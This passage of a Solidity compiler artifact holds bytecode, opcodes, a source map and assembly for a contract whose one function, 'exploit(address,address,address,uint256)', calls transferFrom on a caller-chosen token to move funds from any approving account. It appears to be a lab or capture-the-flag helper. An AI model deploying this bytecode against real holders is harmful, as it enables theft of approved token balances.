							"object": "608060405234801561000f575f5ffd5b5060043610610029575f3560e01c8063bdc813c41461002d575b5f5ffd5b6100476004803603810190610042919061015e565b610049565b005b8373ffffffffffffffffffffffffffffffffffffffff166323b872dd8484846040518463ffffffff1660e01b8152600401610086939291906101e0565b6020604051808303815f875af11580156100a2573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100c6919061024a565b5050505050565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100fa826100d1565b9050919050565b61010a816100f0565b8114610114575f5ffd5b50565b5f8135905061012581610101565b92915050565b5f819050919050565b61013d8161012b565b8114610147575f5ffd5b50565b5f8135905061015881610134565b92915050565b5f5f5f5f60808587031215610176576101756100cd565b5b5f61018387828801610117565b945050602061019487828801610117565b93505060406101a587828801610117565b92505060606101b68782880161014a565b91505092959194509250565b6101cb816100f0565b82525050565b6101da8161012b565b82525050565b5f6060820190506101f35f8301866101c2565b61020060208301856101c2565b61020d60408301846101d1565b949350505050565b5f8115159050919050565b61022981610215565b8114610233575f5ffd5b50565b5f8151905061024481610220565b92915050565b5f6020828403121561025f5761025e6100cd565b5b5f61026c84828501610236565b9150509291505056fea2646970667358221220339664f6a3efaef0779cb5fc61f2dee9573402dcd0b51f7d5dc6d066ae06cbc464736f6c634300081d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xBDC813C4 EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x47 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x42 SWAP2 SWAP1 PUSH2 0x15E JUMP JUMPDEST PUSH2 0x49 JUMP JUMPDEST STOP JUMPDEST DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23B872DD DUP5 DUP5 DUP5 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x86 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x1E0 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xA2 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xC6 SWAP2 SWAP1 PUSH2 0x24A JUMP JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xFA DUP3 PUSH2 0xD1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x10A DUP2 PUSH2 0xF0 JUMP JUMPDEST DUP2 EQ PUSH2 0x114 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x125 DUP2 PUSH2 0x101 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x13D DUP2 PUSH2 0x12B JUMP JUMPDEST DUP2 EQ PUSH2 0x147 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x158 DUP2 PUSH2 0x134 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 PUSH0 PUSH0 PUSH1 0x80 DUP6 DUP8 SUB SLT ISZERO PUSH2 0x176 JUMPI PUSH2 0x175 PUSH2 0xCD JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x183 DUP8 DUP3 DUP9 ADD PUSH2 0x117 JUMP JUMPDEST SWAP5 POP POP PUSH1 0x20 PUSH2 0x194 DUP8 DUP3 DUP9 ADD PUSH2 0x117 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x40 PUSH2 0x1A5 DUP8 DUP3 DUP9 ADD PUSH2 0x117 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x60 PUSH2 0x1B6 DUP8 DUP3 DUP9 ADD PUSH2 0x14A JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP6 SWAP2 SWAP5 POP SWAP3 POP JUMP JUMPDEST PUSH2 0x1CB DUP2 PUSH2 0xF0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x1DA DUP2 PUSH2 0x12B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x1F3 PUSH0 DUP4 ADD DUP7 PUSH2 0x1C2 JUMP JUMPDEST PUSH2 0x200 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x1C2 JUMP JUMPDEST PUSH2 0x20D PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x1D1 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x229 DUP2 PUSH2 0x215 JUMP JUMPDEST DUP2 EQ PUSH2 0x233 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x244 DUP2 PUSH2 0x220 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x25F JUMPI PUSH2 0x25E PUSH2 0xCD JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x26C DUP5 DUP3 DUP6 ADD PUSH2 0x236 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CALLER SWAP7 PUSH5 0xF6A3EFAEF0 PUSH24 0x9CB5FC61F2DEE9573402DCD0B51F7D5DC6D066AE06CBC464 PUSH20 0x6F6C634300081D00330000000000000000000000 ",
							"sourceMap": "116:268:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;155:227;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;330:5;323:26;;;350:6;358:8;368:6;323:52;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;155:227;;;;:::o;88:117:2:-;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:139::-;742:5;780:6;767:20;758:29;;796:33;823:5;796:33;:::i;:::-;696:139;;;;:::o;841:77::-;878:7;907:5;896:16;;841:77;;;:::o;924:122::-;997:24;1015:5;997:24;:::i;:::-;990:5;987:35;977:63;;1036:1;1033;1026:12;977:63;924:122;:::o;1052:139::-;1098:5;1136:6;1123:20;1114:29;;1152:33;1179:5;1152:33;:::i;:::-;1052:139;;;;:::o;1197:765::-;1283:6;1291;1299;1307;1356:3;1344:9;1335:7;1331:23;1327:33;1324:120;;;1363:79;;:::i;:::-;1324:120;1483:1;1508:53;1553:7;1544:6;1533:9;1529:22;1508:53;:::i;:::-;1498:63;;1454:117;1610:2;1636:53;1681:7;1672:6;1661:9;1657:22;1636:53;:::i;:::-;1626:63;;1581:118;1738:2;1764:53;1809:7;1800:6;1789:9;1785:22;1764:53;:::i;:::-;1754:63;;1709:118;1866:2;1892:53;1937:7;1928:6;1917:9;1913:22;1892:53;:::i;:::-;1882:63;;1837:118;1197:765;;;;;;;:::o;1968:118::-;2055:24;2073:5;2055:24;:::i;:::-;2050:3;2043:37;1968:118;;:::o;2092:::-;2179:24;2197:5;2179:24;:::i;:::-;2174:3;2167:37;2092:118;;:::o;2216:442::-;2365:4;2403:2;2392:9;2388:18;2380:26;;2416:71;2484:1;2473:9;2469:17;2460:6;2416:71;:::i;:::-;2497:72;2565:2;2554:9;2550:18;2541:6;2497:72;:::i;:::-;2579;2647:2;2636:9;2632:18;2623:6;2579:72;:::i;:::-;2216:442;;;;;;:::o;2664:90::-;2698:7;2741:5;2734:13;2727:21;2716:32;;2664:90;;;:::o;2760:116::-;2830:21;2845:5;2830:21;:::i;:::-;2823:5;2820:32;2810:60;;2866:1;2863;2856:12;2810:60;2760:116;:::o;2882:137::-;2936:5;2967:6;2961:13;2952:22;;2983:30;3007:5;2983:30;:::i;:::-;2882:137;;;;:::o;3025:345::-;3092:6;3141:2;3129:9;3120:7;3116:23;3112:32;3109:119;;;3147:79;;:::i;:::-;3109:119;3267:1;3292:61;3345:7;3336:6;3325:9;3321:22;3292:61;:::i;:::-;3282:71;;3238:125;3025:345;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "136600",
								"executionCost": "181",
								"totalCost": "136781"
							},
							"external": {
								"exploit(address,address,address,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 116,
									"end": 384,
									"name": "PUSH",
									"source": 1,
									"value": "80"
								},
								{
									"begin": 116,
									"end": 384,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 116,
									"end": 384,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 116,
									"end": 384,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 116,
									"end": 384,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 116,
									"end": 384,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 116,
									"end": 384,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 116,
									"end": 384,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 116,
									"end": 384,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 116,
									"end": 384,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 116,
									"end": 384,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 116,
									"end": 384,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 116,
									"end": 384,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 116,
									"end": 384,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 116,
									"end": 384,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 116,
									"end": 384,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 116,
									"end": 384,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 116,
									"end": 384,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 116,
									"end": 384,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 116,
									"end": 384,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 116,
									"end": 384,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220339664f6a3efaef0779cb5fc61f2dee9573402dcd0b51f7d5dc6d066ae06cbc464736f6c634300081d0033",
									".code": [
										{
											"begin": 116,
											"end": 384,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 116,
											"end": 384,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 116,
											"end": 384,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 116,
											"end": 384,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 116,
											"end": 384,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 384,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 116,
											"end": 384,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 116,
											"end": 384,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 116,
											"end": 384,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 116,
											"end": 384,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 116,
											"end": 384,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 116,
											"end": 384,
											"name": "tag",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 116,
											"end": 384,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 116,
											"end": 384,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 116,
											"end": 384,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 116,
											"end": 384,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 116,
											"end": 384,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 116,
											"end": 384,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 116,
											"end": 384,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 116,
											"end": 384,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 116,
											"end": 384,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 116,
											"end": 384,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 116,
											"end": 384,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 116,
											"end": 384,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 384,
											"name": "PUSH",
											"source": 1,
											"value": "BDC813C4"
										},
										{
											"begin": 116,
											"end": 384,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 116,
											"end": 384,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 116,
											"end": 384,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 116,
											"end": 384,
											"name": "tag",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 116,
											"end": 384,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 116,
											"end": 384,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 116,
											"end": 384,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 116,
											"end": 384,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "tag",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 155,
											"end": 382,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 155,
											"end": 382,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 155,
											"end": 382,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 155,
											"end": 382,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 155,
											"end": 382,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "tag",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 155,
											"end": 382,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 155,
											"end": 382,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "tag",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 155,
											"end": 382,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 155,
											"end": 382,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 330,
											"end": 335,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 323,
											"end": 349,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 323,
											"end": 349,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 323,
											"end": 349,
											"name": "PUSH",
											"source": 1,
											"value": "23B872DD"
										},
										{
											"begin": 350,
											"end": 356,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 358,
											"end": 366,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 368,
											"end": 374,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 323,
											"end": 375,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 323,
											"end": 375,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 323,
											"end": 375,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 323,
											"end": 375,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 155,
											"end": 382,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 88,
											"end": 205,
											"name": "tag",
											"source": 2,
											"value": "16"
										},
										{
											"begin": 88,
											"end": 205,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 197,
											"end": 198,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 194,
											"end": 195,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 187,
											"end": 199,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 334,
											"end": 460,
											"name": "tag",
											"source": 2,
											"value": "18"
										},
										{
											"begin": 334,
											"end": 460,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 371,
											"end": 378,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 411,
											"end": 453,
											"name": "PUSH",
											"source": 2,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 404,
											"end": 409,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 400,
											"end": 454,
											"name": "AND",
											"source": 2
										},
										{
											"begin": 389,
											"end": 454,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 389,
											"end": 454,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 334,
											"end": 460,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 334,
											"end": 460,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 334,
											"end": 460,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 334,
											"end": 460,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 466,
											"end": 562,
											"name": "tag",
											"source": 2,
											"value": "19"
										},
										{
											"begin": 466,
											"end": 562,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 503,
											"end": 510,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 532,
											"end": 556,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "36"
										},
										{
											"begin": 550,
											"end": 555,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 532,
											"end": 556,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "18"
										},
										{
											"begin": 532,
											"end": 556,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 532,
											"end": 556,
											"name": "tag",
											"source": 2,
											"value": "36"
										},
										{
											"begin": 532,
											"end": 556,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 521,
											"end": 556,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 521,
											"end": 556,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 466,
											"end": 562,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 466,
											"end": 562,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 466,
											"end": 562,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 466,
											"end": 562,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 568,
											"end": 690,
											"name": "tag",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 568,
											"end": 690,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 641,
											"end": 665,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "38"
										},
										{
											"begin": 659,
											"end": 664,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 641,
											"end": 665,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "19"
										},
										{
											"begin": 641,
											"end": 665,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 641,
											"end": 665,
											"name": "tag",
											"source": 2,
											"value": "38"
										},
										{
											"begin": 641,
											"end": 665,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 634,
											"end": 639,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 631,
											"end": 666,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 621,
											"end": 684,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "39"
										},
										{
											"begin": 621,
											"end": 684,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 680,
											"end": 681,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 677,
											"end": 678,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 670,
											"end": 682,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 621,
											"end": 684,
											"name": "tag",
											"source": 2,
											"value": "39"
										},
										{
											"begin": 621,
											"end": 684,
											"name": "JUMPDEST",
											"source": 2
										},
										{
